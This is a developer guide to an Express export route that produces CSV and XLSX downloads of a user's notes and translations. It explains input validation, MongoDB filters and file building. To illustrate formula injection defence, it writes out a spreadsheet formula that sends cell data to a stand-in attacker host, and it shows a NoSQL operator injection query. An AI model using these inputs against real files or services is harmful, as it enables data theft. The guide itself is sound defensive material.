# EXPORT_ROUTES.md — `exportRoutes.js` Breakdown

`exportRoutes.js` is the Express router that lets a user **download their notes or translations as a spreadsheet** (`.csv` or `.xlsx`). It accepts the same filters as the list pages, so **what the user sees in a filtered list is what they get in the file**.

```
React (Export button)  ──►  GET /export?type=notes&format=xlsx&notebook=...
                                     │
                                     ▼
                     validate → build Mongo filter → fetch → rows → file
                                     │
React  ◄── file download (Content-Disposition: attachment; filename="note-nest-notes-2026-11-12.xlsx")
```

---

## Table of Contents

1. [Route Summary](#1-route-summary)
2. [Imports & Setup](#2-imports--setup)
3. [Formatting Helpers](#3-formatting-helpers)
4. [safeCell() — Formula Injection Protection](#4-safecell--formula-injection-protection)
5. [Filter Helpers](#5-filter-helpers)
6. [The EXPORTS Config Object](#6-the-exports-config-object)
7. [File Builders](#7-file-builders)
8. [GET /export — The Route](#8-get-export--the-route)
9. [Calling It from React](#9-calling-it-from-react)
10. [Status Code Reference](#10-status-code-reference)
11. [Known Gaps & Housekeeping](#11-known-gaps--housekeeping)

---

## 1. Route Summary

The router is mounted at **`/export`** in `app.js`. There's a **single route**.

| Method | Path | Middleware | Purpose |
|---|---|---|---|
| `GET` | `/export` | `exportLimiter`, `checkJwtToken` | Download notes or translations as `.csv` / `.xlsx` |

### Query parameters

| Param | Required | Applies To | Values |
|---|---|---|---|
| `type` | ✅ | — | `notes` \| `translations` |
| `format` | ✅ | — | `csv` \| `xlsx` (from `FORMATS` in `apiUtil`) |
| `language` | ❌ | notes | A language code, e.g. `af` |
| `notebook` | ❌ | notes | A notebook ObjectId |
| `tag` | ❌ | notes | A tag ObjectId |
| `sourceLanguage` | ❌ | translations | A language code |
| `targetLanguage` | ❌ | translations | A language code |

An empty optional filter (`?language=`) means **"any"**, the same as leaving it out.

### Examples

```
GET /export?type=notes&format=xlsx
GET /export?type=notes&format=csv&notebook=6732a1f0c2b3d4e5f6071829&tag=6732a1f0c2b3d4e5f607182a
GET /export?type=translations&format=xlsx&sourceLanguage=af&targetLanguage=en
```

**Why `GET`?** An export only **reads** data, and a GET URL can be used directly as a download link (see [section 9](#9-calling-it-from-react)).

---

## 2. Imports & Setup

```js
require('dotenv').config()
const express = require('express');
const mongoose = require('mongoose');
const XLSX = require('xlsx');
const { stringify } = require('csv-stringify/sync');
const Note = require('../models/noteSchema');
const Translation = require('../models/translationSchema');
const { checkJwtToken } = require('../middleware/securityMiddleware');
const { exportLimiter } = require('../middleware/rateLimitMiddleware');
const { languageCodeRegex } = require('../util/schemaUtil');
const { languageData } = require('../util/langaugeData');
const { FORMATS, MAX_EXPORT_ROWS } = require('../util/apiUtil')
```

| Import | From | Used For |
|---|---|---|
| `dotenv` | npm | Loads `.env`. It isn't used directly in this file. |
| `express` | npm | Creates the `router` |
| `mongoose` | npm | `ObjectId.isValid()` for the `notebook` and `tag` filters |
| `XLSX` | npm `xlsx` (SheetJS) | Builds the `.xlsx` workbook in memory |
| `stringify` | npm `csv-stringify/sync` | Turns rows into CSV text. It handles quoting of commas, quotes and line breaks. |
| `Note`, `Translation` | models | The two collections that can be exported |
| `checkJwtToken` | `securityMiddleware` | Only logged-in users can export, and only their own data |
| `exportLimiter` | `rateLimitMiddleware` | Exports are heavy (database query + file build), so they're rate-limited separately |
| `languageCodeRegex` | `util/schemaUtil` | Validates the language filters, using the same rule as the schemas |
| `languageData` | `util/langaugeData` | Shows `Afrikaans` instead of `af` in the file |
| `FORMATS` | `util/apiUtil` | The allowed formats, e.g. `['csv', 'xlsx']` |
| `MAX_EXPORT_ROWS` | `util/apiUtil` | The maximum number of rows per file |

### Packages to install

```bash
npm install xlsx csv-stringify
```

---

## 3. Formatting Helpers

### `LANGUAGE_NAMES` + `languageName()`

```js
const LANGUAGE_NAMES = Object.fromEntries(languageData.map(({ code, name }) => [code, name]));
const languageName = (code) => (code ? (LANGUAGE_NAMES[code] || code) : '');
```

This does the same job as the `reduce` in `apiRoutes.js`, written differently:

```js
languageData.map(({ code, name }) => [code, name])// [['af','Afrikaans'], ['zu','Zulu']]
Object.fromEntries(...)// { af: 'Afrikaans', zu: 'Zulu' }
```

| Input | Output |
|---|---|
| `'af'` | `'Afrikaans'` |
| `'xx'` (unknown) | `'xx'`, the code itself |
| `undefined` / `''` | `''`, an empty cell |

### `formatDate()`

```js
const formatDate = (date) => (date ? new Date(date).toISOString().replace('T', ' ').slice(0, 19) : '');
```

| Step | Value |
|---|---|
| `toISOString()` | `2026-11-09T14:03:22.517Z` |
| `.replace('T', ' ')` | `2026-11-09 14:03:22.517Z` |
| `.slice(0, 19)` | `2026-11-09 14:03:22` |

This produces a readable, sortable date that spreadsheet apps recognise. Times are in **UTC** (see [Gap 3](#gap-3-dates-are-utc-not-south-african-time)).

---

## 4. safeCell() — Formula Injection Protection

```js
const safeCell = (value) => {
    if (typeof value !== 'string') return value;
    return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
};
```

### The attack

Spreadsheet apps treat a cell that starts with `=`, `+`, `-` or `@` as a **formula**. If a user (or someone who shares content with them) saves a note titled:

```
=HYPERLINK("http://evil.example/?d="&A2, "Click me")
```

then opening the exported CSV in Excel could run that formula. That can **leak data** from other cells, or, in older setups, run commands. This is known as **CSV / formula injection** (OWASP).

### The fix

A leading apostrophe `'` tells Excel to treat the cell as **text**:

| Original | Exported |
|---|---|
| `=SUM(A1:A9)` | `'=SUM(A1:A9)` |
| `+27 82 123 4567` | `'+27 82 123 4567` |
| `- buy milk` | `'- buy milk` |
| `Shopping list` | `Shopping list` (unchanged) |
| `42` (number) | `42` (non-strings pass through) |

| Regex Part | Matches |
|---|---|
| `^` | Start of the string only |
| `[=+\-@\t\r]` | `=`, `+`, `-` (escaped), `@`, tab, carriage return |

Tab and carriage return are included because some apps strip leading whitespace **before** deciding whether a cell is a formula.

---

## 5. Filter Helpers

```js
const isValidLanguage = (value) => value === undefined || value === ''
    || (typeof value === 'string' && languageCodeRegex.test(value));

const isValidId = (value) => value === undefined || value === ''
    || (typeof value === 'string' && mongoose.Types.ObjectId.isValid(value));
```

Both helpers follow the same rule: **missing or empty is allowed** (meaning "no filter"), otherwise the value must be a valid string.

### Why the `typeof === 'string'` check matters

Express parses query strings with the `qs` library, which can turn the URL into **arrays and objects**:

| URL | `req.query.notebook` |
|---|---|
| `?notebook=abc` | `'abc'` |
| `?notebook=a&notebook=b` | `['a', 'b']` |
| `?notebook[$ne]=x` | `{ $ne: 'x' }` ← a Mongo operator |

Without the type check, `filter.notebook = { $ne: 'x' }` would be a **NoSQL injection**. The string check rejects arrays and objects with a 400.

---

## 6. The EXPORTS Config Object

Rather than writing an `if (type === 'notes') ... else ...` block, each export type is described **as data**. The route reads whichever entry matches `type`.

```js
const EXPORTS = {
    notes:        { sheetName, buildFilter, fetch, columns },
    translations: { sheetName, buildFilter, fetch, columns },
};
```

| Key | Type | Purpose |
|---|---|---|
| `sheetName` | string | The worksheet tab name in `.xlsx` |
| `buildFilter(userId, query)` | function | Validates the query and returns `{ filter }` or `{ error }` |
| `fetch(filter)` | function | Runs the Mongo query and returns plain objects |
| `columns` | array | `[header, (doc) => cellValue]` pairs that define the columns |

**Adding a new export type** (e.g. `notebooks`) means adding one entry here. The route doesn't change.

### 6.1 `notes`

**Filter:** the same as `GET /notes/fetchNotes`.

```js
const filter = { user: userId, isArchived: false, deletedAt: null };
if (language) filter.language = language;
if (notebook) filter.notebook = notebook;
if (tag) filter.tags = tag;
```

| Part | Meaning |
|---|---|
| `user: userId` | Only the user's own notes |
| `isArchived: false, deletedAt: null` | **Active notes only.** Archived and trashed notes aren't exported. |
| `filter.tags = tag` | On an **array** field, MongoDB matches documents whose array **contains** that value |

**Query:**

```js
Note.find(filter)
    .sort({ isPinned: -1, updatedAt: -1 })// Pinned first, then newest — same as the NotesList table
    .limit(MAX_EXPORT_ROWS)
    .select('title plainText language notebook tags isPinned createdAt updatedAt')
    .populate('notebook', 'name')
    .populate('tags', 'name')
    .lean()
```

`plainText` is selected instead of the editor's HTML, so cells contain readable text instead of `<p><strong>...</strong></p>`.

**Columns:**

| Header | Value |
|---|---|
| Title | `n.title` |
| Content | `n.plainText` |
| Language | `languageName(n.language)` → `Afrikaans` |
| Notebook | `n.notebook?.name` (blank if there's no notebook) |
| Tags | Tag names joined with `, ` → `work, urgent` |
| Pinned | `Yes` / `No` |
| Date Added | `formatDate(n.createdAt)` |
| Last Updated | `formatDate(n.updatedAt)` |

The tags column breaks down like this:

```js
(n.tags || [])// Guard against a missing array
    .map((t) => t?.name)// Populated tag -> name
    .filter(Boolean)// Drop tags that were deleted (populate gives null)
    .join(', ')// One cell: "work, urgent"
```

### 6.2 `translations`

**Filter:** the same as `GET /translation/fetch`.

```js
const filter = { user: userId };
if (sourceLanguage) filter.sourceLanguage = sourceLanguage;
if (targetLanguage) filter.targetLanguage = targetLanguage;
```

**Query:** newest first, the linked note's title populated.

**Columns:**

| Header | Value |
|---|---|
| Source Text | `t.sourceText` |
| Source Language | `languageName(t.sourceLanguage)` |
| Translated Text | `t.translatedText` |
| Target Language | `languageName(t.targetLanguage)` |
| Note | `t.note?.title` (blank if it isn't linked to a note) |
| Characters | `t.characterCount ?? ''` |
| Date Added | `formatDate(t.createdAt)` |

`??` vs `||`: `characterCount ?? ''` keeps a real `0`. `|| ''` would turn `0` into a blank cell.

---

## 7. File Builders

### `toRows()`: documents → a 2-D array

```js
const toRows = (docs, columns) => [
    columns.map(([header]) => header),// Row 1: headers
    ...docs.map((doc) => columns.map(([, getValue]) => safeCell(getValue(doc) ?? ''))),// Row 2+: data
];
```

The output is an **array of arrays** (often called "AOA"), which both CSV and XLSX can use:

```js
[
  ['Title', 'Content', 'Language', ...],
  ['Shopping list', 'Milk, eggs', 'English', ...],
  ['Vergadering', 'Notas...', 'Afrikaans', ...],
]
```

| Syntax | Meaning |
|---|---|
| `([header]) =>` | Takes only the first item of each `[header, fn]` pair |
| `([, getValue]) =>` | **Skips** the first item (the leading comma) and takes the function |
| `getValue(doc) ?? ''` | `null`/`undefined` becomes an empty cell |
| `safeCell(...)` | Formula injection protection on **every** data cell |

### `buildCsv()`

```js
const buildCsv = (rows) => Buffer.from('﻿' + stringify(rows), 'utf8');
```

| Piece | Why |
|---|---|
| `stringify(rows)` | Builds proper CSV: values containing `,`, `"` or line breaks are wrapped in quotes and inner quotes are doubled |
| `'﻿'` (BOM) | The **byte order mark**. Without it, Excel guesses the encoding and garbles characters like `ê`, `ô`, `ñ` or non-Latin scripts (e.g. `môre` → `mÃ´re`). |
| `Buffer.from(..., 'utf8')` | Converts to bytes, so `Content-Length` is in **bytes**, not characters |

In the source file the BOM is an **invisible character** between the quotes. Writing it as `'﻿'` makes it visible and stops an editor from removing it without anyone noticing (see [Housekeeping](#housekeeping)).

### `buildXlsx()`

```js
const sheet = XLSX.utils.aoa_to_sheet(rows);// 2-D array -> worksheet
sheet['!cols'] = rows[0].map((_, col) => ({
    wch: Math.min(Math.max(...rows.map((row) => String(row[col] ?? '').length), 10), 60),
}));
const workbook = XLSX.utils.book_new();// Empty workbook
XLSX.utils.book_append_sheet(workbook, sheet, sheetName);// Add the sheet as "Notes" / "Translations"
return XLSX.write(workbook, { type: 'buffer', bookType: 'xlsx' });// Node Buffer
```

**How the column widths are worked out** (`wch` = width in characters):

```
longest = Math.max(...lengths of every cell in this column)
width   = Math.min( Math.max(longest, 10), 60 )
                    └─ at least 10 ─┘   └─ at most 60
```

So short columns don't get squashed, and a long `Content` column doesn't stretch across the whole screen.

### `CONTENT_TYPES`

| Format | MIME Type |
|---|---|
| `csv` | `text/csv; charset=utf-8` |
| `xlsx` | `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet` |

The correct MIME type tells the browser it's a download and lets the operating system pick the right app to open it.

---

## 8. GET `/export` — The Route

### Flow

```
exportLimiter ───► 429 if too many exports
checkJwtToken ───► 401 if not logged in
     ▼
type valid?   ───► 400 "Invalid export type"
format valid? ───► 400 "Invalid export format"
     ▼
buildFilter() ───► 400 "Invalid language code" / "Invalid notebook id" / ...
     ▼
fetch(filter) → toRows() → buildCsv() / buildXlsx()
     ▼
filename + headers → 200 file
```

### Step 1: Validate `type`

```js
const exportType = typeof type === 'string' && Object.hasOwn(EXPORTS, type) ? EXPORTS[type] : null;
```

**Why `Object.hasOwn` and not just `EXPORTS[type]`?** Every object inherits properties from `Object.prototype`:

| `type` | `EXPORTS[type]` | `Object.hasOwn(EXPORTS, type)` |
|---|---|---|
| `'notes'` | the notes config | `true` ✅ |
| `'toString'` | **a function** (inherited) | `false` ✅ |
| `'constructor'` | **the `Object` function** | `false` ✅ |
| `'__proto__'` | **`Object.prototype`** | `false` ✅ |

Without `hasOwn`, `?type=toString` would pass the check and crash later with a 500. `Object.hasOwn` requires Node **16.9+**.

### Step 2: Validate `format`

```js
if (!FORMATS.includes(format)) → 400
```

`includes` uses strict equality, so an array (`?format=csv&format=xlsx`) or an object never matches.

### Step 3: Build the filter

```js
const { filter, error } = exportType.buildFilter(userId, req.query);
if (error) → 400
```

`buildFilter` returns **either** `{ filter }` **or** `{ error }`, never both, and it never throws. Destructuring both makes the check one line.

### Step 4: Fetch and build the file

```js
const docs = await exportType.fetch(filter);
const rows = toRows(docs, exportType.columns);
const file = format === 'csv' ? buildCsv(rows) : buildXlsx(rows, exportType.sheetName);
```

If nothing matches the filter, the file still downloads, with **headers only**. That's not an error.

### Step 5: Build the filename

```js
const filtered = Object.keys(filter).some((key) => !['user', 'isArchived', 'deletedAt'].includes(key));
const date = new Date().toISOString().slice(0, 10);
const filename = `note-nest-${type}${filtered ? '-filtered' : ''}-${date}.${format}`;
```

`filtered` is `true` if the filter has **any key besides the fixed ones**, i.e. the user applied a filter:

| Filter Keys | `filtered` | Filename |
|---|---|---|
| `user, isArchived, deletedAt` | `false` | `note-nest-notes-2026-11-12.xlsx` |
| `user, isArchived, deletedAt, tags` | `true` | `note-nest-notes-filtered-2026-11-12.xlsx` |
| `user, sourceLanguage` | `true` | `note-nest-translations-filtered-2026-11-12.csv` |

The filename is built **only** from validated values (`type` and `format` are whitelisted, and the date is generated by the server), so it can't be used to inject extra headers.

### Step 6: Response headers

```js
res.set({
    'Content-Type': CONTENT_TYPES[format],
    'Content-Disposition': `attachment; filename="${filename}"`,
    'Content-Length': file.length,
    'Cache-Control': 'no-store',
});
return res.status(200).send(file);
```

| Header | Purpose |
|---|---|
| `Content-Type` | What the file is |
| `Content-Disposition: attachment` | **Download** the file instead of displaying it, using this filename |
| `Content-Length` | The size in bytes (`file` is a Buffer, so `.length` is bytes). Lets the browser show download progress. |
| `Cache-Control: no-store` | The file holds private data. Browsers and proxies must not keep a copy. |

---

## 9. Calling It from React

Because the JWT is an **HTTP-only cookie**, the browser sends it automatically. There are two ways to start the download.

### Option A: a plain link (simplest)

```jsx
const params = new URLSearchParams({ type: 'notes', format: 'xlsx', notebook: selectedNotebook || '' });
<a href={`/export?${params}`}>Export to Excel</a>// Browser downloads using Content-Disposition
```

This only works when the frontend and API are on the **same origin** (or behind a proxy). There's no way to show an error message, because a 400 or 429 opens as a JSON page.

### Option B: fetch + blob (better error handling)

```js
const exportFile = async (query) => {
    const res = await fetch(`/export?${new URLSearchParams(query)}`, { credentials: 'include' });// Send the auth cookie
    if (!res.ok) {
        const { message } = await res.json().catch(() => ({}));// Errors come back as JSON
        throw new Error(message || 'Export failed');
    }
    const filename = res.headers.get('Content-Disposition')?.match(/filename="(.+)"/)?.[1] || 'export';// Use the server's filename
    const url = URL.createObjectURL(await res.blob());// Turn the file into a temporary URL
    const link = Object.assign(document.createElement('a'), { href: url, download: filename });
    link.click();// Trigger the download
    URL.revokeObjectURL(url);// Free the memory
};
```

For a **cross-origin** API, the server must also send `Access-Control-Expose-Headers: Content-Disposition`, otherwise `res.headers.get('Content-Disposition')` returns `null`.

---

## 10. Status Code Reference

| Code | When |
|---|---|
| `200` | File sent (possibly headers only, if nothing matched) |
| `400` | Invalid `type`, `format`, language code, notebook ID or tag ID |
| `401` | (From `checkJwtToken`) No token, or an invalid or expired one |
| `429` | (From `exportLimiter`) Too many exports |
| `500` | Database or file-building error |

---

## 11. Known Gaps & Housekeeping

### Gap 1: The apostrophe shows up in `.xlsx` files

`safeCell` runs on **every** export, but formula injection is a **CSV** problem. SheetJS's `aoa_to_sheet` stores strings as **text cells** (type `s`), which Excel never runs as formulas. So in `.xlsx` files the apostrophe is unnecessary, and it **appears in the cell**: a note titled `- todo` shows as `'- todo`.

**Fix:** apply `safeCell` only for CSV:

```js
const toRows = (docs, columns, sanitise) => [
    columns.map(([header]) => header),
    ...docs.map((doc) => columns.map(([, getValue]) => {
        const value = getValue(doc) ?? '';
        return sanitise ? safeCell(value) : value;// Only CSV needs the apostrophe
    })),
];
// In the route:
const rows = toRows(docs, exportType.columns, format === 'csv');
```

### Gap 2: Truncation at `MAX_EXPORT_ROWS` is silent

If the user has more rows than `MAX_EXPORT_ROWS`, `.limit()` cuts the export short and **nothing tells them**. Options:

- Fetch `MAX_EXPORT_ROWS + 1` rows. If you get the extra one, drop it and set a header the frontend can read:
  ```js
  res.set('X-Export-Truncated', 'true');// Frontend shows "Only the first N rows were exported"
  ```
- Or return a 400 asking the user to apply a filter.

### Gap 3: Dates are UTC, not South African time

`formatDate()` and the filename date both use `toISOString()`, which is **UTC**. South Africa is **UTC+2**, so:

- A note saved at 09:00 SAST shows as `07:00:00` in the file.
- An export made between 00:00 and 02:00 SAST gets **yesterday's** date in the filename.

**Fix** (`sv-SE` is a common trick, because that locale formats dates as `YYYY-MM-DD HH:mm:ss`):

```js
const formatDate = (date) => (date
    ? new Date(date).toLocaleString('sv-SE', { timeZone: 'Africa/Johannesburg' })// "2026-11-09 16:03:22"
    : '');
const date = new Date().toLocaleDateString('sv-SE', { timeZone: 'Africa/Johannesburg' });// "2026-11-12"
```

Or label the column headers `(UTC)` so it's clear.

### Gap 4: Excel's 32,767-character cell limit

An Excel cell can hold at most **32,767 characters**. If a note's `plainText` is longer, Excel may report the file as damaged and offer to "repair" it. If very long notes are possible, cap the value:

```js
['Content', (n) => (n.plainText || '').slice(0, 32767)],// Excel's per-cell maximum
```

### Gap 5: `FORMATS` and `CONTENT_TYPES` can drift apart

`FORMATS` lives in `apiUtil`, but `CONTENT_TYPES` and the builder choice live here. If someone adds `'json'` to `FORMATS`, it would pass validation, get **no** `Content-Type`, and be built as **xlsx** (the `else` branch). Either derive one from the other:

```js
if (!Object.hasOwn(CONTENT_TYPES, format)) → 400// CONTENT_TYPES becomes the single source of truth
```

or keep a builder map, `const BUILDERS = { csv: buildCsv, xlsx: buildXlsx }`, and validate against that.

### Gap 6: The whole file is built in memory

The entire result set, the rows array, and the finished file all sit in memory before sending. `MAX_EXPORT_ROWS` and `exportLimiter` keep that manageable. Streaming (Mongo cursor → `csv-stringify` stream → `res`) is only worth the extra complexity if the limit grows into the tens of thousands.

### Housekeeping

| Line(s) | Issue | Suggestion |
|---|---|---|
| 11 | `require('dotenv').config()` isn't used in this file | Load it once in `app.js` |
| 25 | The `FORMATS, MAX_EXPORT_ROWS` import has no comment and no semicolon | `const { FORMATS, MAX_EXPORT_ROWS } = require('../util/apiUtil');// Allowed formats and the row cap` |
| 129 | The BOM is an invisible character in the string literal | Write it as `'﻿'` so it's visible and can't be stripped by accident |
| 160 | "Conditional rendering" | That's a React UI term. This is a **guard clause** / validation check. |
| 2–8 | The header doesn't mention `MAX_EXPORT_ROWS` or the rate limiter | Add a line: "Limited to MAX_EXPORT_ROWS rows; rate-limited per IP" |
| 24 | `'../util/langaugeData'` | The same suspected typo as in the other route files. Only rename it if you rename the actual file. |
